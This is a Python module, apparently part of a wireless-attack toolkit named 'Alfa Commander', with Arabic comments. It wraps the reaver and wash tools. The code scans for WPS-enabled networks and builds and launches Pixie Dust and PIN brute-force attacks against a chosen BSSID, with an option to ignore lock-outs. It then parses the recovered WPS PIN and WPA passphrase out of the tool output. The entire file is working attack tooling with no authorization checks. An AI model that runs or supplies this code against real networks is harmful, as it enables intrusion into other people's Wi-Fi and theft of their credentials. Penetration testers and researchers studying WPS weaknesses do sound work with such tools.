# ============================================================
# Alfa Commander - reaver Wrapper
# هجمات WPS
# ============================================================

from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from app.utils.shell import StreamingProcess, run, CommandResult, command_exists
from app.utils.validators import normalize_mac
from app.logger import get_logger

logger = get_logger()


# ------------------------------------------------------------
# نماذج
# ------------------------------------------------------------
@dataclass
class ReaverOptions:
    interface: str
    bssid: str
    channel: int
    pin: Optional[str] = None           # إذا None، يستخدم brute force
    delay: int = 1
    timeout: int = 5
    retries: int = 3
    pixie_dust: bool = True
    pin_attempts: int = 11000
    ignore_locks: bool = False
    dh_small: bool = False
    verbose: bool = True
    output_dir: Optional[Path] = None


@dataclass
class ReaverResult:
    success: bool
    wps_pin: Optional[str] = None
    wpa_psk: Optional[str] = None
    ssid: Optional[str] = None
    output: str = ""


# ------------------------------------------------------------
# الغلاف
# ------------------------------------------------------------
class Reaver:
    BINARY = "reaver"
    WASH = "wash"

    @staticmethod
    def is_available() -> bool:
        return command_exists(Reaver.BINARY)

    @staticmethod
    def wash_available() -> bool:
        return command_exists(Reaver.WASH)

    # ---------- بناء الأمر ----------
    @staticmethod
    def build_command(opts: ReaverOptions) -> list[str]:
        args = [
            Reaver.BINARY,
            "-i", opts.interface,
            "-b", normalize_mac(opts.bssid),
            "-c", str(opts.channel),
            "-d", str(opts.delay),
            "-T", str(opts.timeout),
            "-r", f"{opts.retries}:{opts.retries}",
            "-N", str(opts.pin_attempts),
        ]

        if opts.pin:
            args.extend(["-p", opts.pin])
        elif opts.pixie_dust:
            args.append("-K")

        if opts.ignore_locks:
            args.append("-L")
        if opts.dh_small:
            args.append("-S")
        if opts.verbose:
            args.append("-vv")
        if opts.output_dir:
            args.extend(["-s", str(opts.output_dir)])

        return args

    # ---------- تشغيل الهجوم ----------
    @staticmethod
    async def attack(opts: ReaverOptions) -> StreamingProcess:
        args = Reaver.build_command(opts)
        mode = "Pixie Dust" if opts.pixie_dust and not opts.pin else "PIN"
        logger.info(f"بدء هجوم WPS ({mode}) على {opts.bssid}")
        proc = StreamingProcess(args)
        await proc.start()
        return proc

    # ---------- تحليل المخرجات ----------
    @staticmethod
    def parse_output(output: str) -> ReaverResult:
        result = ReaverResult(success=False, output=output)

        # WPS PIN
        m = re.search(r"WPS PIN:\s*'?(\d{4,8})'?", output, re.IGNORECASE)
        if m:
            result.wps_pin = m.group(1)

        # WPA PSK
        m = re.search(r"WPA PSK:\s*'([^']+)'", output, re.IGNORECASE)
        if m:
            result.wpa_psk = m.group(1)

        # SSID
        m = re.search(r"SSID:\s*'([^']+)'", output, re.IGNORECASE)
        if m:
            result.ssid = m.group(1)

        if result.wpa_psk or result.wps_pin:
            result.success = True

        return result

    # ---------- wash: كشف WPS ----------
    @staticmethod
    def wash_scan(interface: str, timeout: int = 30) -> CommandResult:
        """كشف الشبكات التي تحتوي على WPS مفعّل."""
        args = [Reaver.WASH, "-i", interface, "-s"]
        return run(args, timeout=timeout)

    @staticmethod
    def parse_wash_output(output: str) -> list[dict]:
        """تحليل مخرجات wash."""
        networks = []
        for line in output.splitlines():
            m = re.match(
                r"^(\S+)\s+(\S+)\s+(\d+)\s+(\S+)\s+([\d.-]+)\s+(\S+)\s+(.*)$",
                line,
            )
            if m:
                networks.append({
                    "bssid": m.group(1),
                    "channel": int(m.group(2)) if m.group(2).isdigit() else 0,
                    "rssi": m.group(3),
                    "wps_version": m.group(4),
                    "locked": m.group(5),
                    "vendor": m.group(6),
                    "essid": m.group(7).strip(),
                })
        return networks


# ------------------------------------------------------------
# دوال مختصرة
# ------------------------------------------------------------
async def pixie_dust_attack(
    interface: str,
    bssid: str,
    channel: int,
    output_dir: Optional[Path] = None,
) -> StreamingProcess:
    opts = ReaverOptions(
        interface=interface,
        bssid=bssid,
        channel=channel,
        pixie_dust=True,
        output_dir=output_dir,
    )
    return await Reaver.attack(opts)


async def pin_attack(
    interface: str,
    bssid: str,
    channel: int,
    pin: Optional[str] = None,
) -> StreamingProcess:
    opts = ReaverOptions(
        interface=interface,
        bssid=bssid,
        channel=channel,
        pin=pin,
        pixie_dust=False,
    )
    return await Reaver.attack(opts)


# ------------------------------------------------------------
# Module-level shortcuts
# ------------------------------------------------------------
def build_command(opts):
    return Reaver.build_command(opts)


def attack(opts):
    return Reaver.attack(opts)


def parse_output(output: str):
    return Reaver.parse_output(output)


def wash_scan(iface: str, timeout: int = 30):
    return Reaver.wash_scan(iface, timeout)


def parse_wash_output(output: str):
    return Reaver.parse_wash_output(output)

